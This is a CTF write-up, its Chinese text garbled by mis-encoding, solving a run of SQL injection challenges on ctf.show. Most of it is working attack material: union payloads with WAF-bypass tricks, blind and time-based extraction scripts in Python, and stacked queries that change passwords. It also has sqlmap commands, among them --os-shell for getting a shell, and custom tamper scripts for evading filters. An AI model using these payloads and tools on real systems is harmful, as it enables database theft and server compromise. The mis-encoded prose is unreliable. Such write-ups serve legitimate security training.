selectï¼Œå¤§å°å†™ç»•è¿‡æˆ–ä¸‡èƒ½å¯†ç `1' or 1=1--+`\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' unIon sElEct 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**177**\n\nè¿‡æ»¤äº†ç©ºæ ¼ï¼Œ/**/å³å¯ï¼Œä¸èƒ½ç”¨+ï¼Œurlä¼šè¢«è½¬æˆç©ºæ ¼\n\n```\n0'/**/union/**/select/**/1,2,group_concat(password)/**/from/**/ctfshow_user%23\n```\n\n**178**\n\nè¿‡æ»¤äº†ç©ºæ ¼å’Œ*ï¼Œåˆ¶è¡¨ç¬¦%09ç»•è¿‡\n\n```\n0'%09union%09select%091,2,group_concat(password)%09from%09ctfshow_user%23\n```\n\n**179**\n\n%09ä¹Ÿæ²¡äº†ï¼Œè¿˜å‰©%0c\n\n```\n0'%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%23\n```\n\n**180**\n\nçœŸæ²¡æ‹›äº†ï¼Œçœ‹çœ‹wpï¼Œé€šè¿‡åå¼•å·åˆ†å‰²ï¼Œç»\n\n```\n0'union%0cselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'3\n```\n\nè¿˜æœ‰\n\n```\n0'or(id=26)and'1'='1\n```\n\n**181**\n\nselectä¸è§äº†ï¼Œä¸‡èƒ½å¯†ç \n\n```\n0'%0cor%0cid='26\n```\n\n**182**\n\nflagä¸è§äº†ï¼Œå…¶å®ä¸å½±å“ä¸Šé¢çš„ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥å°è¯•æ¨¡ç³ŠåŒ¹é…\n\n```\n0'%0cor%0cusername%0clike%0c'%fla%\n```\n\n**183**\n\nä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å’Œå¸ƒå°”ç›²æ³¨\n\n```\nWHERE email REGEXP 'a'\n```\n\næ„æ€æ˜¯åœ¨emailä¸­åŒ¹é…açš„\n\nå†™è„šæœ¬å’¯\n\n```python\nimport requests\nurl = 'http://24a744c9-dd02-415a-b46b-68e87b328edd.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"(ctfshow_user)where(substr(pass,{i},1))regexp('{j}')\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 1;\" in tex:\n        \tprint(j,end='')\n```\n\n**184**\n\nRIGHT JOIN å…³é”®å­—ä¼šå³è¡¨ (table_name2) é‚£é‡Œè¿”å›æ‰€æœ‰çš„è¡Œï¼Œå³ä½¿åœ¨å·¦è¡¨ (table_name1) ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œã€‚\n\n```\nSELECT column_name(s)\nFROM table_name1\nRIGHT JOIN table_name2\n```\n\næˆ‘ä»¬å°†åŒ¹é…åçš„è¡¨ä½œä¸ºå³è¡¨ï¼Œä½¿ç”¨æ­£åˆ™æŸ¥è¯¢å³å¯\n\n`ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))`\n\n```python\nimport requests\nurl = 'http://cf6d0357-c567-4db6-9fab-5827e7d5e40d.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            break\n\n```\n\nè®°å¾—é—®onæ˜¯å•¥æ„æ€\n\n**185**\n\nè¿‡æ»¤äº†æ•°å­—ï¼Œç”¨true=1ç›¸åŠ æ„é€ æ•°å­—å’§\n\n```python\nimport requests\nurl = 'http://7cdec59f-0059-4f5d-ac07-fcac41696822.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\ndef lo(x):\n    tmp=\"true\"\n    for i in range(1,x):\n        tmp=tmp+\"+true\"\n    return tmp\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,({lo(i)}),(true))regexp(char({lo(ord(j))})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            break\n```\n\n**186**\n\nåŒä¸Šï¼Œå¼€æ‰“å°±å®Œäº†\n\n**187**\n\né’ˆå¯¹`md5(xxx,true)`çš„ç»•è¿‡ï¼š[é“¾æ¥](https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450)\n\nåªèƒ½å¯»æ‰¾md5\n\næ‰€ä»¥å¯†ç è¾“å…¥:ffifdyopå³å¯\n\nè¿›è¡Œè¿ç®—å¾—å‡ºçš„ç»“æœä¸º\n\n'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b\n\nç”±äºoråé¢6ä¸ºçœŸï¼Œæ‰€ä»¥è¯­å¥æ’ä¸ºçœŸ\n\n**188**\n\nSQLæ¯”è¾ƒçœŸçœŸç¦»è°±\n\nå­—ç¬¦ä¸²å½“ä½œæ•°å­—å¤„ç†\n\nå³å½“mysqlä¸­å­—ç¬¦ä¸²ä¸æ•°å­—åšæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†å­—ç¬¦ä¸²å½“ä½œæ•°å­—æ¥æ¯”è¾ƒã€‚å¦‚123bacä¼šå½“ä½œ123å¤„ç†ã€‚  å› æ­¤æˆ‘ä»¬åœ¨æŸ¥è¯¢çš„æ—¶å€™å³ä½¿username=0ï¼Œä¹Ÿä¼šè¿”å›ä¸€äº›ä»¥0å¼€å¤´çš„æ•°æ®ã€‚\n\n00å³å¯\n\n**189**\n\nç©ºæ ¼æ¶ˆå¤±æ³•ï¼Œæç¤ºflagåœ¨api/flag.phpä¸­ï¼Œå¿…ç„¶è¦è¯»å–æ–‡ä»¶å’¯\n\nå°è¯•ç”¨æˆ·åå‘ç°åªæœ‰ä¸¤ç§å›æ˜¾ç»“æœï¼Œä¸€ç§æ˜¯æŸ¥è¯¢å¤±è´¥ï¼Œä¸€ç§æ˜¯å¯†ç é”™è¯¯\n\nå¸ƒå°”ç›²æ³¨èµ°èµ·\n\n```python\nimport requests\nurl = 'http://36ec0642-dfd4-460f-951d-afbf1887db2c.challenge.ctf.show/api/index.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f'if(load_file(\"/var/www/html/api/index.php\")regexp(\\'{tmp}\\'),0,1)#','password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"å¯†ç é”™è¯¯\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**190**\n\nè¿›è¡Œä¸€ä¸ªå¸ƒå°”çš„ç›²æ³¨\n\n```python\nimport requests\nurl = 'http://f808d3c6-5e32-4c6c-a217-16eb4cd1c842.challenge.ctf.show/api/'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and ((substr((select f1ag from ctfshow_fl0g),{i},1))='{j}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"å¯†ç é”™è¯¯\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**191**\n\nè¿‡æ»¤äº†file|into|asciiä¸Šä¸ªè„šæœ¬è¿˜èƒ½ç”¨\n\n**192**\n\nè¿‡æ»¤äº†file|into|ascii|ord|hexç»§ç»­ç”¨\n\n**193**\n\nè¿‡æ»¤äº†file|into|ascii|ord|hex|substré—®é¢˜ä¸å¤§ï¼Œæ¢left\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://dc60958a-3c76-4425-acf9-cef85100c566.challenge.ctf.show/api/'\nflagstr = r\",{flqazwsxedcrvtgbyhnujmikolp-0123456789}_\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and (left((select f1ag from ctfshow_flxg),{i})='{tmp}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"ç”¨æˆ·åä¸å­˜åœ¨\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**194**\n\næˆ‘è°¢è°¢ä½ å•Šleftå’Œrightéƒ½æ²¡äº†\n\nè¿‡æ»¤äº†file|into|ascii|ord|hex|substr|char|left|right|substringï¼Œç”¨likeæˆ–è€…æ­£åˆ™ï¼ˆå…¶å®ç”¨midä¹Ÿè¡Œï¼‰\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://a0589fee-511c-495e-b8c9-319e9f5cc086.challenge.ctf.show/api/'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}_,\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and if(((select group_concat(f1ag) from ctfshow_flxg)regexp('{tmp}')),1,0)#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"ç”¨æˆ·åä¸å­˜åœ¨\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**195**\n\nå †å æ”¹å¯†ç å’¯ï¼ŒæŸ¥è¯¢è¯­å¥ä¸­çš„usernameæ²¡æœ‰ç”¨å¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥æŸ¥è¯¢çš„æ—¶å€™ç”¨åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²\n\n```\n1;update`ctfshow_user`set`pass`=0x313131;\n1\n0x61646d696e\n111\n```\n\n**196**\n\nğŸ˜…\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-10 11.29.32.png)\n\n**197ï¼Œ198**\n\nä¸€ä¸ªwpè„šæœ¬\n\n```python\n# @Author:Y4tacker\nimport requests\n\nurl = \"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/\"\nfor i in range(100):\n    if i == 0:\n        data = {\n            'username': '0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '\n                        'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '\n                        'varchar(255);',\n            'password': f'{i}'\n        }\n        r = requests.post(url, data=data)\n    data = {\n        'username': '0x61646d696e',\n        'password': f'{i}'\n    }\n    r = requests.post(url, data=data)\n    if \"ç™»é™†æˆåŠŸ\" in r.json()['msg']:\n        print(r.json()['msg'])\n        break\n```\n\næˆ‘é€‰ç¦»è°±æ–¹æ³•ï¼š\n\n```\n# @Author:Y4tacker\n# username=0;show tables;\n# pass=ctfshow_user\n```\n\n**199ï¼Œ200**\n\nåªæœ‰ç¦»è°±æ–¹æ³•èƒ½ç”¨äº†\n\n**201**\n\nsqlmapä½¿ç”¨å¼€å§‹\n\n```\n//æŸ¥åº“\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" --dbs\n//æŸ¥è¡¨\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web --tables\n//æŸ¥å­—æ®µ \nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user --columns\n//æŸ¥å€¼\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C id,pass,username --dump\n```\n\n**202**\n\nä½¿ç”¨POSTè¯·æ±‚ï¼Œæ·»åŠ --dataå‚æ•°æ¥è®¾ç½®\n\n```\nsqlmap -u http://84e4c090-49b9-47dd-a749-2b144bba6ff5.challenge.ctf.show/api/ --data=\"id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**203**\n\nè°ƒæ•´è¯·æ±‚æ–¹å¼ï¼Œæ­¤å¤„è°ƒæ•´ä¸ºPUTè¯·æ±‚ï¼Œè®°å¾—åŠ ä¸ŠContent-Typeä¸ç„¶ä¼šå˜è¡¨å•æäº¤\n\n```\nsqlmap -u http://86418dcd-b385-474c-b132-554a8ee6a95d.challenge.ctf.show/api/index.php --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**204**\n\nåŠ ä¸Šcookieï¼Œç”¨--cookie\n\n```\nsqlmap -u http://024304b8-be6a-48da-bc31-a8fcb796f2e8.challenge.ctf.show/api/index.php --cookie=\"UM_distinctid=17ff4d2091576a-09cf5f45e352f9-113f645d-384000-17ff4d209161689; PHPSESSID=honuvgjau5711m3j9tn84hloip; ctfshow=2e0d6ee1573392a73c0cca1476342faa\" --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**205**\n\næç¤ºapié‰´æƒï¼Œå‘ç°è¯·æ±‚å‰ä¼šå…ˆå¯¹ä¸€ä¸ªurlè¿›è¡Œè°ƒç”¨\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-10 21.53.17.png)\n\nä½¿ç”¨å¦‚ä¸‹ä¸¤ä¸ªå‚æ•°\n\n```\n--safe-url è®¾ç½®åœ¨æµ‹è¯•ç›®æ ‡åœ°å€å‰è®¿é—®çš„å®‰å…¨é“¾æ¥\n--safe-freq è®¾ç½®ä¸¤æ¬¡æ³¨å…¥æµ‹è¯•å‰è®¿é—®å®‰å…¨é“¾æ¥çš„æ¬¡æ•°\n```\n\næœ€ç»ˆå‘½ä»¤~~æ‚„æ‚„æ¢è¡¨åå’Œåˆ—åçœŸçš„å¯æ¶~~\n\n```\nsqlmap -u http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/index.php --safe-url=\"http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxc -C flagv --dump\n```\n\n**206**\n\næç¤ºSQLéœ€è¦é—­åˆï¼Œ~~å½“æˆ‘sqlmapå‚»æ˜¯å§~~ï¼ŒåŒä¸Šå³å¯\n\n**207**\n\n--tamper çš„åˆä½“éªŒ\n\n[tamperæ€»ç»“](https://blog.csdn.net/whatday/article/details/54774043)\n\nä½¿ç”¨SQLMapæä¾›çš„tamperè„šæœ¬ï¼Œå¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å¼€åº”ç”¨ç¨‹åºçš„æ•æ„Ÿå­—ç¬¦è¿‡æ»¤ã€ç»•è¿‡WAFè§„åˆ™çš„é˜»æŒ¡ï¼Œç»§è€Œè¿›è¡Œæ¸—é€æ”»å‡»ï¼Œ--tamper=TAMPER åˆ©ç”¨ç»™å®šçš„è„šæœ¬è¿›è¡Œç¯¡æ”¹æ³¨å…¥æ•°æ®ï¼Œè¯¥é¢˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨è‡ªå¸¦çš„space2comment.pyå³å¯ç»•è¿‡\n\n```\nsqlmap -u http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/index.php --safe-url=\"http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --tamper=\"space2comment.py\"\n```\n\n**208**\n\nè¿‡æ»¤äº†å°å†™çš„selectï¼Œä½†æ˜¯sqlmapä¸­æ‰€æœ‰SELECTéƒ½æ˜¯å¤§å†™ï¼ŒåŒä¸Šå³å¯\n\n```\nsqlmap -u http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/index.php --safe-url=\"http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --tamper=\"space2comment.py\"\n```\n\n**209**\n\nè¿‡æ»¤äº†ç©ºæ ¼ï¼Œ*å’Œ=ï¼Œè®²é“ç†ä½¿ç”¨bluecoat.pyå°±è¡Œï¼Œä½†æ˜¯å‡ºä¸æ¥ï¼Œåªèƒ½è‡ªå·±ç¼–å†™è„šæœ¬æ›¿æ¢äº†ï¼Œå°†ç©ºæ ¼ç”¨%09æ›¿æ¢ï¼Œ=ç”¨LIKEæ›¿æ¢\n\n```\nsqlmap -u http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx,id,tes --dump --batch --tamper web209.py\n```\n\n```python\n#web209.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += chr(0x9)\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == '=':\n                retVal += chr(0x9) + 'like' + chr(0x9)\n                continue\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += chr(0x9)\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n\n```\n\n**210**\n\nå¯¹å­—ç¬¦ä¸²è¿›è¡Œbase64è§£ç åè½¬å†è§£ç ï¼Œé‚£å°±ç¼–ç åè½¬å†ç¼–ç \n\n```\nsqlmap -u http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch --tamper web210.py\n```\n\n```python\n#web210.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\nimport base64\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n\n    retVal = payload\n\n    if payload:\n        retVal=retVal.encode()\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n    return retVal.decode()\n```\n\n**211**\n\nç›¸æ¯”äºä¸Šé¢˜å¤šè¿‡æ»¤äº†ç©ºæ ¼ï¼ŒåŠ ä¸Šspace2commitè„šæœ¬å³å¯\n\n```\nsqlmap -u http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"space2commit.py,web210.py\"\n```\n\n**212**\n\nå‰ä¸¤ä¸ªåŠ èµ·æ¥\n\n```\nsqlmap -u http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**213**\n\nä¸€é”®getshellï¼Œ--os-shell\n\n```\nsqlmap -u http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --os-shell --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**214**\n\næ—¶é—´ç›²æ³¨å¼€å§‹\n\né¦–é¡µå‘ç°ç½‘ç»œæµé‡ä¸­æœ‰select.jsï¼ŒæŸ¥çœ‹ä»£ç \n\n```javascript\n\nlayui.use('element', function(){\n  var element = layui.element;\n  element.on('tab(nav)', function(data){\n    console.log(data);\n  });\n});\n\n$.ajax({\n      url:'api/',\n      dataType:\"json\",\n      type:'post',\n      data:{\n        ip:returnCitySN[\"cip\"],\n        debug:0\n      }\n\n    });\n```\n\nå‘ç°æäº¤çš„è¡¨å•ä¸­æœ‰ä¸¤ä¸ªå˜é‡ï¼Œæµ‹è¯•ä¸€ä¸‹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-12 14.27.34.png)\n\næµ‹è¯•æˆåŠŸï¼Œå¼€å§‹ç¼–å†™ä»£ç \n\n```python\nimport requests\n\nurl=\"http://7a5edb92-03ea-49ff-bd27-30b753229c99.challenge.ctf.show/api/\"\nflagchar=\"-{},qwertyuiopasdfghjklzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1 or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagx\"),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'ip': f'1 or if((substr((select group_concat(flaga) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**215**\n\nå•å¼•å·é—­åˆ\n\n```python\nimport requests\n\nurl=\"http://59e08013-c379-4607-a6bf-c11d5c4d6d6e.challenge.ctf.show/api/\"\nflagchar=\"-{},flagqwertyuiopsdhjkzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'ip': f'1\\' or if((substr((select group_concat(flagaa) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**216**\n\nbase64ç¼–ç \n\n```python\nimport requests\n\nurl=\"http://fe2f1a17-e483-4137-b85d-9fa3a6daaa18.challenge.ctf.show/api/\"\nflagchar=\"-{},ctfshowlagbde1234567890\"\nnamechar=\",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxcc\"),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'ip': f'\"MQ==\") or if((substr((select group_concat(flagaac) from ctfshow_flagxcc),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=1.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**217**\n\nsleepä¸èƒ½ç”¨äº†å•¦ï¼Œéƒ½ctfshowå®³å¾—å•¦ï¼Œæ‹œæ‰˜ï¼Œæ¢benchmark\n\n```\nimport requests\n\nurl = \"http://e7d85700-c8a1-48c2-bea8-4ead2e0976b4.challenge.ctf.show/api/\"\nflagchar = \"-{},ctfshowlagbde1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1, 1000):\n    for j in flagchar:\n        data = {\n            #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxccb\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'ip': f'1) or if(((substr((select group_concat(flagaabc) from ctfshow_flagxccb),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'debug': '1'\n        }\n        try:\n            requests.post(url=url, data=data, timeout=4)\n        except:\n            print(j, end='')\n            break\n\n```\n\n**218**\n\nbenchmarkä¹ŸğŸˆšï¸äº†ï¼Œæ¢ç¬›å¡å°”ç§¯\n\n```python\nimport requests\n\nurl = \"http://de5b41b6-9f89-4e0a-b913-7c33a143979a.challenge.ctf.show/api/\"\nflagchar = \"-{},abcdef1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor k in range(10):\n    print()\n    for i in range(1, 50):\n        for j in flagchar:\n            data = {\n                #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),1)#',\n                #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n                'ip': f'1) or if(((substr((select group_concat(flagaac) from ctfshow_flagxc),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                print(j,end=\"\")\n                break\n\n```\n\n**219**\n\nè¿‡æ»¤äº†rlikeï¼Œç¬›å¡å°”ç§¯ä¾ç„¶å¯ç”¨ï¼ŒåŒä¸Šå³å¯\n\n**220**\n\nsleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr\n\nçœŸèƒ½æ»¤ï¼Œæ¢left\n\n```\nimport requests\n\nurl = \"http://ee633dfd-4a05-4685-bbf6-1da4b5fc4d1d.challenge.ctf.show/api/\"\nflagchar = \"ctfshow-{},abde1234567890\"\nnamechar = \"flag,ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nflag=\"\"\nfor k in range(10):\n    print()\n    flag = \"\"\n    for i in range(1, 50):\n        for j in flagchar:\n            tmp=flag+j\n            data = {\n                'ip': f'1) or if((left((select flagaabcc from ctfshow_flagxcac),{i})=\\'{tmp}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                flag=tmp\n                print(j,end=\"\")\n                break\n```\n\næ—¶é—´ç›²æ³¨ï¼Œç»“æŸ\n\n**221**\n\nlimitæ³¨å…¥ï¼Œæ¬¢è¿æ”¶çœ‹Pç¥åšå®¢\n\næŠ¥é”™æ³¨å…¥\n\n```\nSELECT field FROM user WHERE id >0 ORDER BY id 